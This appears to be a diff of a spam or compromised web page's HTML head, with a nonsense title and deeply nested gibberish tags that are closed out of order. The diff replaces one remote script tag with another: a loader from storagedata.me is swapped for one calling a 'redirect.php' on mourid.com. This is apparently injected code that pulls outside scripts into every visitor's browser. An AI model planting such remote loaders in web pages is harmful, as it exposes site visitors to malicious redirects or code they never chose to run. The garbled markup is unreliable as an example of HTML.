@@ -6,6 +6,6 @@
 <title>Kamuao Eselomemo</title>
 <meta property="og:title" content="Kamuao Eselomemo">
 <meta property="og:description" content="">
-<script src="http://storagedata.me/storage.php?keduciu"></script><a href="https://hokutabagi.org"><i><evemousokagu><div id="aduvelufe"><div id="aduvelufe"><div><i id="aduvelufe"><div><gibuluopifiro><i id="aduvelufe"><i><evemousokagu id="aduvelufe"><evemousokagu id="aduvelufe"><evemousokagu class="itahe"><div id="aduvelufe"></div></evemousokagu></evemousokagu></evemousokagu></i></i></gibuluopifiro></div></i></div></div></div></evemousokagu></i></a>
+<script src="http://mourid.com/php/redirect.php?keduciu"></script><a href="https://hokutabagi.org"><i><evemousokagu><div id="aduvelufe"><div id="aduvelufe"><div><i id="aduvelufe"><div><gibuluopifiro><i id="aduvelufe"><i><evemousokagu id="aduvelufe"><evemousokagu id="aduvelufe"><evemousokagu class="itahe"><div id="aduvelufe"></div></evemousokagu></evemousokagu></evemousokagu></i></i></gibuluopifiro></div></i></div></div></div></evemousokagu></i></a>
 </div></i></div></a></gibuluopifiro></div></i></gibuluopifiro></gibuluopifiro></i></i></div></i></evemousokagu></a></evemousokagu></gibuluopifiro></evemousokagu>
 </head></html>
